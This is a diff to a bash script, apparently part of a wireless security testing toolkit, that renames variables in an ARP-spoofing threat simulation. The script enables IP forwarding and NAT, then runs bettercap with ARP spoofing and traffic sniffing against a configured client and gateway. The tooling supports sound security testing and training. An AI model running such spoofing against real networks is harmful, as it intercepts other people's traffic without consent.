@@ -30,43 +30,43 @@ print_blank
 
 # ─── Show Parameters ───
 print_section "Simulation Parameters"
-print_none "Threat     : $T014_NAME ($T014_ID)"
+print_none "Threat     : $SCN_NAME ($SCN_ID)"
 print_none "Interface  : $INTERFACE"
-print_none "Tool       : $T014_TOOL"
-print_none "Mode       : $T014_MODE"
+print_none "Tool       : $SCN_TOOL"
+print_none "Mode       : $SCN_MODE"
 
 confirmation
 
 # ─── Show AP Config ───
 print_section "Access Point / Client Preparation"
 print_action "Launch Access Point and associate a client device"
-print_none "Client IP  : $T014_TARGET_IP"
-print_none "Gateway IP : $T014_TARGET_GW"
-print_none "Forward IF : $T014_FWD_INTERFACE"
+print_none "Gateway IP : $SCN_GATEWAY"
+print_none "Client IP  : $SCN_TARGET_IP"
+print_none "Forward IF : $SCN_FWD_INTERFACE"
 
 confirmation
 
 # ─── Show Capture Config ───
 print_section "WSTT Capture Preparation"
 print_action "Launch a full or filtered capture using WSTT"
-print_none "BSSID      : $T014_BSSID"
-print_none "Channel    : $T014_CHANNEL"
-print_none "Duration   : $T014_DURATION seconds"
+print_none "BSSID      : $SCN_BSSID"
+print_none "Channel    : $SCN_CHANNEL"
+print_none "Duration   : $SCN_DURATION seconds"
 
 confirmation
 
 # ─── Run Simulation ───
 clear
-print_section "Simulation Running"
+print_section "Simulation"
 
 ensure_managed_mode
 print_blank
 print_action "Starting NAT: Client Internet access ENABLED"
 sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
-sudo iptables -t nat -A POSTROUTING -o $T014_FWD_INTERFACE -j MASQUERADE
+sudo iptables -t nat -A POSTROUTING -o $SCN_FWD_INTERFACE -j MASQUERADE
 print_blank
-print_waiting "Launching ARP Spoofing from Wireless Entry Point"
-sudo timeout "$T014_DURATION" bettercap -iface "$INTERFACE" -eval "set arp.spoof.targets $T014_TARGET_IP; set arp.spoof.gateway $T014_TARGET_GW; arp.spoof on; net.sniff on"
+print_waiting "Running"
+sudo timeout "$SCN_DURATION" bettercap -iface "$INTERFACE" -eval "set arp.spoof.targets $SCN_TARGET_IP; set arp.spoof.gateway $SCN_GATEWAY; arp.spoof on; net.sniff on"
 EXIT_CODE=$?
 print_action "Stopping NAT"
 sudo iptables -F
